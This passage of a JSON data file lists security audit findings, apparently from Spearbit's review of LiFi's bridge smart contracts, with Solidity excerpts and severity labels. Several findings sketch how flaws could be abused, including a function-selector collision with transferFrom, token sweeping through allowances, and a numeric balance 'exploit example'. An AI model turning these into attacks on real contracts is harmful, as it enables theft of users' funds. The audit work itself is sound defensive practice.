        "body": "There is a contract to pay fees for using the bridge: FeeCollector. This is used by crafting a transaction by the frontend API, which then calls the contract via _executeAndCheckSwaps(). Here is an example of the contract Here is an example of the contract of such a transaction Its whitelisted here This way no fees are paid if a developer is using the LiFi contracts directly. Also it is using a mechanism that isnt suited for this. The _executeAndCheckSwaps() is geared for swaps and has several checks on balances. These (and future) checks could interfere with the fee payments. Also this is a complicated and non transparent approach. The project has suggested to see _executeAndCheckSwaps() as a multicall mechanism.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "_executeSwaps of Executor.sol doesnt have a whitelist",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The function _executeSwaps() of Executor.sol doesnt have a whitelist, whereas _executeSwaps() of SwapperV2.sol does have a whitelist. Calling arbitrary addresses is dangerous. For example, unlimited al- lowances can be set to allow stealing of leftover tokens in the Executor contract. Luckily, there wouldnt normally be allowances set from users to the Executor.sol so the risk is limited. Note: also see \"Too generic calls in GenericBridgeFacet allow stealing of tokens\" contract Executor is IAxelarExecutable, Ownable, ReentrancyGuard, ILiFi { function _executeSwaps(... ) ... { for (uint256 i = 0; i < _swapData.length; i++) { if (_swapData[i].callTo == address(erc20Proxy)) revert UnAuthorized(); // Prevent calling ,! ERC20 Proxy directly LibSwap.SwapData calldata currentSwapData = _swapData[i]; LibSwap.swap(_lifiData.transactionId, currentSwapData); } } contract SwapperV2 is ILiFi { function _executeSwaps(... ) ... { for (uint256 i = 0; i < _swapData.length; i++) { LibSwap.SwapData calldata currentSwapData = _swapData[i]; if ( !(appStorage.dexAllowlist[currentSwapData.approveTo] && appStorage.dexAllowlist[currentSwapData.callTo] && appStorage.dexFuncSignatureAllowList[bytes32(currentSwapData.callData[:8])]) ) revert ContractCallNotAllowed(); LibSwap.swap(_lifiData.transactionId, currentSwapData); } } Based on the comments of the LiFi project there is also the use case to call more generic contracts, which do not return any token, e.g., NFT buy, carbon offset. It probably better to create new functionality to do this.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Processing of end balances",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The contract SwapperV2 has the following construction (twice) to prevent using any already start balance.  it gets a start balance.  does an action.  if the end balance > start balance. then it uses the difference. else (which includes start balance == end balance) it uses the end balance. So if the else clause it reached it uses the end balance and ignores any start balance. If the action hasnt changed the balances then start balance == end balance and this amount is used. When the action has lowered the balances then end balance is also used. This defeats the codes purpose. Note: normally there shouldnt be any tokens in the LiFi Diamond contract so the risk is limited. Note Swapper.sol has similar code. contract SwapperV2 is ILiFi { modifier noLeftovers(LibSwap.SwapData[] calldata _swapData, address payable _receiver) { ... uint256[] memory initialBalances = _fetchBalances(_swapData); ... // all kinds of actions newBalance = LibAsset.getOwnBalance(curAsset); curBalance = newBalance > initialBalances[i] ? newBalance - initialBalances[i] : newBalance; ... } function _executeAndCheckSwaps(...) ... { ... uint256 swapBalance = LibAsset.getOwnBalance(finalTokenId); ... // all kinds of actions uint256 newBalance = LibAsset.getOwnBalance(finalTokenId); swapBalance = newBalance > swapBalance ? newBalance - swapBalance : newBalance; ... }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Processing of initial balances",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The LiFi code bases contains two similar source files: Swapper.sol and SwapperV2.sol. One of the differences is the processing of msg.value for native tokens, see pieces of code below. The implementation of SwapperV2.sol sends previously available native token to the msg.sender. The following is exploit example. Assume that:  the LiFi Diamond contract contains 0.1 ETH.  a call is done with msg.value == 1 ETH.  and _swapData[0].fromAmount ETH, which is the amount to be swapped. Option 1Swapper.sol: initialBalances == 1.1 ETH - 1 ETH == 0.1 ETH. Option 2 SwapperV2.sol: initialBalances == 1.1 ETH. After the swap getOwnBalance()is1.1 - 0.5 == 0.6 ETH. Option 1 Swapper.sol: returns 0.6 - 0.1 = 0.5 ETH. Option 2 SwapperV2.sol: returns 0.6 ETH (so includes the previously present ETH). 0.5 == Note: the implementations of noLeftovers() are also different in Swapper.sol and SwapperV2.sol. Note: this is also related to the issue \"Pulling tokens by LibSwap.swap() is counterintuitive\", because the ERC20 are pulled in via LibSwap.swap(), whereas the msg.value is directly added to the balance. As there normally shouldnt be any token in the LiFi Diamond contract the risk is limited. contract Swapper is ILiFi { function _fetchBalances(...) ... { ... for (uint256 i = 0; i < length; i++) { address asset = _swapData[i].receivingAssetId; uint256 balance = LibAsset.getOwnBalance(asset); if (LibAsset.isNativeAsset(asset)) { balances[i] = balance - msg.value; } else { balances[i] = balance; } } return balances; } } contract SwapperV2 is ILiFi { function _fetchBalances(...) ... { ... for (uint256 i = 0; i < length; i++) { balances[i] = LibAsset.getOwnBalance(_swapData[i].receivingAssetId); } ... } } The following functions do a comparable processing of msg.value for the initial balance:  swapAndCompleteBridgeTokensViaStargate() of Executor.sol  swapAndCompleteBridgeTokens() of Executor.sol  swapAndExecute() of Executor.sol  swapAndCompleteBridgeTokens() of XChainExecFacet 25 if (!LibAsset.isNativeAsset(transferredAssetId)) { ... } else { startingBalance = LibAsset.getOwnBalance(transferredAssetId) - msg.value; } However in Executor.sol function swapAndCompleteBridgeTokensViaStargate() isnt optimal for ERC20 tokens because ERC20 tokens are already deposited in the contract before calling this function. function swapAndCompleteBridgeTokensViaStargate(... ) ... { ... if (!LibAsset.isNativeAsset(transferredAssetId)) { startingBalance = LibAsset.getOwnBalance(transferredAssetId); // doesn't correct for initial balance } else { ... } ,! } So assume:  0.1 ETH was in the contract.  1 ETH was added by the bridge.  0.5 ETH is swapped. Then the StartingBalance is calculated to be 0.1 ETH + 1 ETH == 1.1 ETH. So no funds are returned to the receiver as the end balance is 1.1 ETH - 0.5 ETH == 0.6 ETH, is smaller than 1.1 ETH. Whereas this should have been (1.1 ETH - 0.5 ETH) - 0.1 ETH == 0.5 ETH.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Improve dexAllowlist",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The functions _executeSwaps() of both SwapperV2.sol and Swapper.sol use a whitelist to make sure the right functions in the allowed dexes are called. The checks for approveTo, callTo and signature (callData) are independent. This means that any signature is valid for any dex combined with any approveTo address. This grands more access than necessary. This is important because multiple functions can have the same signature. For example these two functions have the same signature:  gasprice_bit_ether(int128) 26  transferFrom(address,address,uint256) See bytes4_signature=0x23b872dd Note: brute forcing an innocent looking function is straightforward The transferFrom() is especially dangerous because it allows sweeping tokens from other users that have set an allowance for the LiFi Diamond. If someone gets a dex whitelisted, which contains a function with the same signature then this can be abused in the current code. Present in both SwapperV2.sol and Swapper.sol: function _executeSwaps(...) ... { ... if ( !(appStorage.dexAllowlist[currentSwapData.approveTo] && appStorage.dexAllowlist[currentSwapData.callTo] && appStorage.dexFuncSignatureAllowList[bytes32(currentSwapData.callData[:8])]) ) revert ContractCallNotAllowed(); ... } }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Pulling tokens by LibSwap.swap() is counterintuitive",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The function LibSwap.swap() pulls in tokens via transferFromERC20() from msg.sender when needed. When put in a loop, via _executeSwaps(), it can pull in multiple different tokens. It also doesnt detect accidentally sending of native tokens with ERC20 tokens. This approach is counterintuitive and leads to risks. Suppose someone wants to swap 100 USDC to 100 DAI and then 100 DAI to 100 USDT. If the first swap somehow gives back less tokens, for example 90 DAI, then LibSwap.swap() pulls in 10 extra DAI from msg.sender. Note: this requires the msg.sender having given multiple allowances to the LiFi Diamond. Another risk is that an attacker tricks a user to sign a transaction for the LiFi protocol. Within one transaction it can sweep multiple tokens from the user, cleaning out his entire wallet. Note: this requires the msg.sender having given multiple allowances to the LiFi Diamond. In Executor.sol the tokens are already deposited, so the \"pull\" functionality is not needed and can even result in additional issues. In Executor.sol it tries to \"pull\" tokens from \"msg.sender\" itself. In the best case of ERC20 implementations (like OpenZeppeling, Solmate) this has no effect. However some non standard ERC20 imple- mentations might break. 27 contract SwapperV2 is ILiFi { function _executeSwaps(...) ... { ... for (uint256 i = 0; i < _swapData.length; i++) { ... LibSwap.swap(_lifiData.transactionId, currentSwapData); } } } library LibSwap { function swap(...) ... { ... uint256 initialSendingAssetBalance = LibAsset.getOwnBalance(fromAssetId); ... uint256 toDeposit = initialSendingAssetBalance < fromAmount ? fromAmount - ,! initialSendingAssetBalance : 0; ... if (toDeposit != 0) { LibAsset.transferFromERC20(fromAssetId, msg.sender, address(this), toDeposit); } } } Use LibAsset.depositAsset() before doing",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Too many bytes are checked to verify the function selector",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The function _executeSwaps() slices the callData with 8 bytes. The function selector is only 4 bytes. Also see docs So additional bytes are checked unnecessarily, which is probably unwanted. Present in both SwapperV2.sol and Swapper.sol: function _executeSwaps(...) ... { ... if ( !(appStorage.dexAllowlist[currentSwapData.approveTo] && appStorage.dexAllowlist[currentSwapData.callTo] && appStorage.dexFuncSignatureAllowList[bytes32(currentSwapData.callData[:8])]) // should be 4 ) revert ContractCallNotAllowed(); ... } } Definition of dexFuncSignatureAllowList in LibStorage.sol: struct LibStorage { ... mapping(bytes32 => bool) dexFuncSignatureAllowList; ... // could be bytes4 }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Check address(self) isnt accidentally whitelisted",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "There are several access control mechanisms. If they somehow would allow address(self) then risks would increase as there are several ways to call arbitrary functions. library LibAccess { function addAccess(bytes4 selector, address executor) internal { ... accStor.execAccess[selector][executor] = true; } } contract AccessManagerFacet { function setCanExecute(...) ... { ) external { ... _canExecute ? LibAccess.addAccess(_selector, _executor) : LibAccess.removeAccess(_selector, ,! _executor); } } contract DexManagerFacet { function addDex(address _dex) external { ... dexAllowlist[_dex] = true; ... } function batchAddDex(address[] calldata _dexs) external { dexAllowlist[_dexs[i]] = true; ... ... } }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Verify anyswap token",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The AnyswapFacet supplies _anyswapData.token to different functions of _anyswapData.router. These functions interact with the contract behind _anyswapData.token. If the _anyswapData.token would be malicious then tokens can be stolen. Note, this is relevant if the LiFi contract are called directly without using the API. 30 function _startBridge(...) ... { ... IAnyswapRouter(_anyswapData.router).anySwapOutNative{ value: _anyswapData.amount }( _anyswapData.token,...); ... IAnyswapRouter(_anyswapData.router).anySwapOutUnderlying( _anyswapData.token, ... ); ... IAnyswapRouter(_anyswapData.router).anySwapOut( _anyswapData.token, ...); ... ,! }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "More thorough checks for DAI in swapAndStartBridgeTokensViaXDaiBridge()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The function swapAndStartBridgeTokensViaXDaiBridge() checks lifiData.sendingAssetId == DAI, however it doesnt check that the result of the swap is DAI (e.g. _swapData[_swapData.length - 1].re- ceivingAssetId == DAI ). function swapAndStartBridgeTokensViaXDaiBridge(...) ... { ... if (lifiData.sendingAssetId != DAI) { revert InvalidSendingToken(); } gnosisBridgeData.amount = _executeAndCheckSwaps(lifiData, swapData, payable(msg.sender)); ... _startBridge(gnosisBridgeData); // sends DAI }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Funds transferred via Connext may be lost on destination due to incorrect receiver or calldata",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "_startBridge() in AmarokFacet.sol and NXTPFacet.sol sets user-provided receiver and call data for the destination chain.  The receiver is intended to be LifiDiamond contract address on destination chain.  The call data is intended such that the functions completeBridgeTokensVia{Amarok/NXTP}() or swapAnd- CompleteBridgeTokensVia{Amarok/NXTP}() are called. In case of a frontend bug or a user error, these parameters can be malformed which will lead to stuck (and stolen) funds on destination chain. Since the addresses and functions are already known, the contract can instead pass this data to Connext instead of taking it from the user. 31",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Check output of swap is equal to amount bridged",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The result of swap (amount) isnt always checked to be the same as the bridged amount (_bridge- Data.amount). This way tokens could stay in the LiFi Diamond if more tokens are received with a swap than bridged. function swapAndStartBridgeTokensViaPolygonBridge(...) ... { ... uint256 amount = _executeAndCheckSwaps(_lifiData, _swapData, payable(msg.sender)); ... _startBridge(_lifiData, _bridgeData, true); } function _startBridge(..., BridgeData calldata _bridgeData, ...) ... { ... if (LibAsset.isNativeAsset(_bridgeData.assetId)) { rootChainManager.depositEtherFor{ value: _bridgeData.amount }(_bridgeData.receiver); } else { ... LibAsset.maxApproveERC20(IERC20(_bridgeData.assetId), _bridgeData.erc20Predicate, ,! _bridgeData.amount); bytes memory depositData = abi.encode(_bridgeData.amount); rootChainManager.depositFor(_bridgeData.receiver, _bridgeData.assetId, depositData); } ... }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Missing timelock logic on the DiamondCut facets",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "In LiFi Diamond, any facet address/function selector can be changed by the contract owner. Connext, Diamond should go through a proposal window with a delay of 7 days. In function diamondCut( FacetCut[] calldata _diamondCut, address _init, bytes calldata _calldata ) external override { LibDiamond.enforceIsContractOwner(); LibDiamond.diamondCut(_diamondCut, _init, _calldata); }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Data from emit LiFiTransferStarted() cant be relied on",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "Most of the function do an emit like LiFiTransferStarted(). Some of the fields of the emits are (sometimes) verified, but most fields come from the input variable _lifiData. The problem with this is that anyone can do solidity transactions to the LiFi bridge and supply wrong data for the emit. For example: transfer a lot of Doge coins and in the emit say they are transferring wrapped BTC. Then the statistics would say a large amount of volume has been transferred, while in reality it is neglectable. The advantage of using a blockchain is that the data is (seen as) reliable. If the data isnt reliable, it isnt worth the trouble (gas cost) to store it in a blockchain and it could just be stored in an offline database. The result of this is, its not useful to create a subgraph on the emit data (because it is unreliable). This would mean a lot of extra work for subgraph builders to reverse engineer what is going on. Also any kickback fees to in- tegrators or referrers cannot be based on this data because it is unreliable. Also user interfaces & dashboards could display the wrong information. 33 function startBridgeTokensViaOmniBridge(LiFiData calldata _lifiData, ...) ... { ... LibAsset.depositAsset(_bridgeData.assetId, _bridgeData.amount); _startBridge(_lifiData, _bridgeData, _bridgeData.amount, false); } function _startBridge(LiFiData calldata _lifiData, ... ) ... { ... // do actions emit LiFiTransferStarted( _lifiData.transactionId, \"omni\", \"\", _lifiData.integrator, _lifiData.referrer, _lifiData.sendingAssetId, _lifiData.receivingAssetId, _lifiData.receiver, _lifiData.amount, _lifiData.destinationChainId, _hasSourceSwap, false ); }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Missing emit in XChainExecFacet",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The function swapAndCompleteBridgeTokens of Executor does do an emit LiFiTransferCom- pleted , while the comparable function in XChainExecFacet doesnt do this emit. This way there will be missing emits. contract Executor is IAxelarExecutable, Ownable, ReentrancyGuard, ILiFi { function swapAndCompleteBridgeTokens(LiFiData calldata _lifiData, ... ) ... { ... emit LiFiTransferCompleted( ... ); } } contract XChainExecFacet is SwapperV2, ReentrancyGuard { function swapAndCompleteBridgeTokens(LiFiData calldata _lifiData, ... ) ... { ... // no emit } }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Different access control to withdraw funds",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "To withdraw any stuck tokens, WithdrawFacet.sol provides two functions: executeCallAndWith- draw() and withdraw(). Both have different access controls on them.  executeCallAndWithdraw() can be called by the owner or if msg.sender has been approved to call a function whose signature matches that of executeCallAndWithdraw().  withdraw() can only be called by the owner. If the function signature of executeCallAndWithdraw() clashes with an approved signature in execAccess map- ping, the approved address can steal all the funds in LifiDiamond contract.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Use internal where possible",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "Several functions have an access control where the msg.sender if compared to address(this), which means it can only be called from the same contract. In the current code with the various generic call mechanisms this isnt a safe check. For example the function _execute() from Executor.sol can circumvent this check. Luckily the function where this has been used have a low risk profile so the risk of this issue is limited. function swapAndCompleteBridgeTokensViaStargate(...) ... { if (msg.sender != address(this)) { revert InvalidCaller(); } ... }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Event of transfer is not emitted in the AxelarFacet",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The usage of the LiFi protocol depends largely to the off chain APIs. It takes all values, fees, limits, chain ids and addresses to be called from the APIs. The events are useful to record these changes on-chain for off-chain monitors/tools/interfaces when integrating with off-chain APIs. Although, other facets are emitting LiFiTransferStarted event, AxelarFacet does not emit this event. contract AxelarFacet { function executeCallViaAxelar(...) ... {} function executeCallWithTokenViaAxelar(...) ... {} } On the receiving side, the Executor contract does do an emit in function _execute() but not in function _- executeWithToken(). contract Executor is IAxelarExecutable, Ownable, ReentrancyGuard, ILiFi { function _execute(...) ... { ... emit AxelarExecutionComplete(callTo, bytes4(callData)); } function _executeWithToken( ... // no emit } }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Improve checks on the facets",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "In the facets, receiver/destination address and amount checks are missing.  The symbol parameter is used to get address of token with gateways tokenAddresses function. tokenAd- dresses function get token address by mapping. If the symbol does not exist, the token address can be zero. AxelarFacet and Executor do not check If the given symbol exists or not. 36 contract AxelarFacet { function executeCallWithTokenViaAxelar(...) ... { address tokenAddress = s.gateway.tokenAddresses(symbol); } function initAxelar(address _gateway, address _gasReceiver) external { s.gateway = IAxelarGateway(_gateway); s.gasReceiver = IAxelarGasService(_gasReceiver); } } contract Executor { function _executeWithToken(...) ... { address tokenAddress = s.gateway.tokenAddresses(symbol); } }  GnosisBridgeFacet, CBridgeFacet, HopFacet and HyphenFacets are missing receiver address/amount check. contract CBridgeFacet { function _startBridge(...) ... { ... _cBridgeData.receiver ... } } contract GnosisBridgeFacet { function _startBridge(...) ... { ... gnosisBridgeData.receiver ... } } contract HopFacet { function _startBridge(...) ... { _hopData.recipient, ... ... } } contract HyphenFacet { function _startBridge(...) ... { _hyphenData.recipient ... ... } }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Use keccak256() instead of hex",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "Several NAMESPACEs are defined, some with a hex value and some with a keccak256(). To be able to verify they are all different it is better to use the same format everywhere. If they would use the same value then the variables stored on that location could interfere with each other and the LiFi Diamond could start to behave unreliably. ... NAMESPACE = hex\"c7...\"; // keccak256(\"com.lifi.facets.axelar\") ... NAMESPACE = hex\"cf...\"; // keccak256(\"com.lifi.facets.ownership\"); ... NAMESPACE = hex\"a6...\"; ReentrancyGuard.sol: AxelarFacet.sol: OwnershipFacet.sol: PeripheryRegistryFacet.sol: ... NAMESPACE = hex\"dd...\"; // keccak256(\"com.lifi.facets.periphery_registry\"); ,! StargateFacet.sol: LibAccess.sol: ,! LibDiamond.sol: keccak256(\"com.lifi.library.access.management\") ... NAMESPACE = keccak256(\"com.lifi.facets.stargate\"); ... ACCESS_MANAGEMENT_POSITION = hex\"df...\"; // ... DIAMOND_STORAGE_POSITION = keccak256(\"diamond.standard.diamond.storage\");",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Remove redundant Swapper.sol",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "There are two versions of Swapper.sol (e.g Swapper.sol and SwapperV2.sol ) which are function- ally more or less the same. The WormholeFacet contract is the only one still using Swapper.sol. Having two versions of the same code is confusing and difficult to maintain. import { Swapper } from \"../Helpers/Swapper.sol\"; contract WormholeFacet is ILiFi, ReentrancyGuard, Swapper { }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Use additional checks for transferFrom()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "Several functions transfer tokens via transferFrom() without checking the return code. Some of the contracts are not covering edge cases like non-standard ERC20 tokens that do not:  revert on failed transfers.  Some ERC20 implementations dont revert is the balance is insufficient but return false. Other functions transfer tokens with checking if the amount of tokens received is equal to the amount of tokens requested. This relevant for tokens that withhold a fee. Luckily there is always additional code, like bridge, dex or pool code, that verifies the amount of tokens received, so the risk is limited. contract AxelarFacet { function executeCallWithTokenViaAxelar(... ) ... { ... IERC20(tokenAddress).transferFrom(msg.sender, address(this), amount); // no check on return ,! code & amount of tokens ... } } contract ERC20Proxy is Ownable { function transferFrom(...) ... { ... IERC20(tokenAddress).transferFrom(from, to, amount); // no check on return code & amount of ,! tokens ... } } contract FusePoolZap { function zapIn(...) ... { ... IERC20(_supplyToken).transferFrom(msg.sender, address(this), _amount); // no check on amount of tokens ,! return code & } } library LibSwap { function swap(...) ... { ... LibAsset.transferFromERC20(fromAssetId, msg.sender, address(this), toDeposit); // no check on amount of tokens } ,! }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Move code to check amount of tokens transferred to library",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "Facet.sol,OptimismBridgeFacet.sol, PolygonBridgeFacet.sol and StargateFacet.sol, to verify all required tokens are indeed transferred. The following piece of code is present However it doesnt check msg.value == _bridgeData.amount in case a native token is used. The more generic depositAsset() of LibAsset.sol does have this check. uint256 _fromTokenBalance = LibAsset.getOwnBalance(_bridgeData.assetId); LibAsset.transferFromERC20(_bridgeData.assetId, msg.sender, address(this), _bridgeData.amount); if (LibAsset.getOwnBalance(_bridgeData.assetId) - _fromTokenBalance != _bridgeData.amount) { revert InvalidAmount(); }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Fuse pools are not whitelisted",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "Rari Fuse is a permissionless framework for creating and running user-created open interest rate pools with customizable parameters. On the FusePoolZap contract, the correctness of pool is not checked. Be- cause of Fuse is permissionless framework, an attacker can create a fake pool, through this contract a user can be be tricked in the malicious pool. function zapIn( address _pool, address _supplyToken, uint256 _amount ) external {}",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Missing two-step transfer ownership pattern",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "Executor contract used for arbitrary cross-chain and same chain execution, swaps and transfers. The Executor contract uses Ownable from OpenZeppelin which is a simple mechanism to transfer the ownership not supporting a two-steps transfer ownership pattern. OpenZeppelin describes Ownable as: Ownable is a simpler mechanism with a single owner \"role\" that can be assigned to a single account. This simpler mechanism can be useful for quick tests but projects with production concerns are likely to outgrow it. Transferring ownership is a critical operation and transferring it to an inaccessible wallet or renouncing the owner- ship e.g. by mistake, can effectively lost functionality.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Use low-level call only on contract addresses",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "In the following case, if callTo is an EOA, success will be true. (bool success, ) = callTo.call(callData); The user intention here will be to do a smart contract call. So if there is no code deployed at callTo, the execution should be reverted. Otherwise, users can be under a wrong assumption that their cross-chain call was successful.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Functions which do not expect ether should be non-payable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "A function which doesnt expect ether should not be marked payable. swapAndStartBridgeTo- kensViaAmarok() is a payable function, however it reverts when called for the native asset: if (_bridgeData.assetId == address(0)) { revert TokenAddressIsZero(); } So in the case where _bridgeData.assetId != address(0), any ether sent as msg.value is locked in the con- tract.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Incompatible contract used in the WormholeFacet",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "During the code review, It has been observed that all other faucets are using SwapperV2 contract. However, the WormholeFacet is still using Swapper contract. With the recent change on the SwapperV2, leftOvers can be send to specific receiver. With the using old contract, this capability will be lost in the related faucet. Also, LiFi Team claims that Swapper contract will be deprecated. ... import { Swapper } from \"../Helpers/Swapper.sol\"; /// @title Wormhole Facet /// @author [LI.FI](https://li.fi) /// @notice Provides functionality for bridging through Wormhole contract WormholeFacet is ILiFi, ReentrancyGuard, Swapper { ...",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Solidity version bump to latest",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "During the review the newest version of solidity was released with the important bug fixes & Bug.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Bridge with AmarokFacet can fail due to hardcoded variables",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "During the code review, It has been observed that callbackFee and relayerFee are set to 0. However, Connext mentioned that Its set to 0 on the testnet. On the mainnet, these variables can be edited by Connext and AmarokFacet bridge operations can fail. ... IConnextHandler.XCallArgs memory xcallArgs = IConnextHandler.XCallArgs({ params: IConnextHandler.CallParams({ to: _bridgeData.receiver, callData: _bridgeData.callData, originDomain: _bridgeData.srcChainDomain, destinationDomain: _bridgeData.dstChainDomain, agent: _bridgeData.receiver, recovery: msg.sender, forceSlow: false, receiveLocal: false, callback: address(0), callbackFee: 0, // fee paid to relayers; relayers don't take any fees on testnet relayerFee: 0, // fee paid to relayers; relayers don't take any fees on testnet slippageTol: _bridgeData.slippageTol }), transactingAssetId: _bridgeData.assetId, amount: _amount }); ...",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Store _dexs[i] into a temp variable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The DexManagerFacet can store _dexs[i] into a temporary variable to save some gas. function batchAddDex(address[] calldata _dexs) external { if (msg.sender != LibDiamond.contractOwner()) { LibAccess.enforceAccessControl(); } mapping(address => bool) storage dexAllowlist = appStorage.dexAllowlist; uint256 length = _dexs.length; for (uint256 i = 0; i < length; i++) { _checkAddress(_dexs[i]); if (dexAllowlist[_dexs[i]]) continue; dexAllowlist[_dexs[i]] = true; appStorage.dexs.push(_dexs[i]); emit DexAdded(_dexs[i]); } } 43",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Optimize array length in for loop",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "In a for loop the length of an array can be put in a temporary variable to save some gas. This has been done already in several other locations in the code. function swapAndStartBridgeTokensViaStargate(...) ... { ... for (uint8 i = 0; i < _swapData.length; i++) { ... } ... }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "StargateFacet can be optimized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
